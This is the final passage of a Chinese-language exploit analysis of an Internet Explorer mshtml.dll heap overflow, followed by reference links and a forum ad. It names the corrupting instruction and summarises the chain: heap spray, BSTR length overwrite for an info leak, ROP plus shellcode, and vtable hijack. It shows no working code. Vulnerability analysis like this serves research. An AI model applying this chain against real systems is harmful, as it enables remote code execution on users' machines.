spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">}</code></td></tr></tbody></table>

写入发生于第28次循环，对应指令为`0x6368CD98`处`mov [esi+8], ebx`，写入前：

 

![](upload/attach/202102/817966_AXEAT2PUBZXY3DQ.jpg)

 

写入完成后调用该虚表指针时即可控制执行流。

 

最后，总结下利用思路：Heap Spray—>释放内存—>`<col>`占位—>堆溢出(更改BSTR长度位)—>"越界读"虚表指针，计算`mshtml.dll`基址—>Heap Spray(布局ROP+Shellcode)—>堆溢出(更改虚表指针到ROP+Shellcode地址)

0x03 参阅链接
---------

*   [HTMLElement.style](https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/style)
*   [display](https://developer.mozilla.org/zh-CN/docs/Web/CSS/display)
*   [Python实现生成相对地址的ROP](https://blog.csdn.net/qq_35519254/article/details/53234599)

  

[看雪学院推出的专业资质证书《看雪安卓应用安全能力认证 v1.0》（中级和高级）！](https://bbs.pediy.com/thread-265424.htm)